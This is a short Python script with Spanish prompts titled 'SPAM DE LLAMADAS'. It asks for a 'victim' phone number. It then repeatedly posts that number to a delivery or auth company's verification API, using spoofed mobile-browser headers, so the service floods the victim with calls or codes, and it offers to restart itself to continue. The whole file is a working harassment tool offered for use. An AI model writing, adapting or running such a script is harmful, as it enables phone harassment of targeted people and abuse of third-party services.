import os,sys,time,requests,json
from requests import post
def balik():
   f = input("\033[31mQuieres seguir ejecutando el script: (s/n): \033[31m")
   if f == "s":
      os.system("python3 spamcall-v6.0.py")
   elif f == "n":
        sys.exit("\033[31m")

m = '\033[1;31m' 
b = '\033[1;36m'       
k = '\033[1;33m' 
h = '\033[1;32m'
u = '\033[1;35m'
p = '\033[1;37m'
ut = '\033[1;34m'
     

os.system('clear')
def asw(b):
  for m in b + "\n":
      sys.stdout.write(m)
      sys.stdout.flush()
      time.sleep(3./100)
                     
def lo(s):
  for c in s  + "\n":
      sys.stdout.write(c)
      sys.stdout.flush()
      time.sleep(3./100)

asw(f"{m}Entrando Al Script de Spam de Llamadas....................................................................")
print()
asw(f"{m}LISTO PARA UTILIZARSE...         ")
os.system("clear")                                                                            
asw(f"{m}*************************************************************************************")
asw(f"{m}                              SPAM DE LLAMADAS      ")
asw(f"{m}*************************************************************************************") 
asw(f"{m}\033[90m>\033[33mIngrese el numero de la victima de esta forma: \033[33m+34644xxxxxxx")
no = input("\033[90m> \033[33mPon el numero de la victima: \033[31m")


ua = {
"Host": "api.myfave.com",
"Conection": "keep-alive",
"x-user-agent": "Fave-PWA/v2.0.0",
"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36",
"content-type": "application/json",
"Accept": "*/*",
"Origin": "https://m.myfave.com",
"Referer": "https://m.myfave/jakarta/auth",                  
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
for i in range(1,5):
    dat = {"phone":no}
    r = requests.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=ua).text
    if "6c047709f9da4291a568fa84b97b6d47" in r:
        print ("\033[90m> \033[1;97mEnviando Spam... \033[1;94m> \033[91m")
    else:
        print ("\033[90m> \033[1;97mEnviando Spam... \033[1;94m> \033[92m")
    time.sleep(25)

balik() 
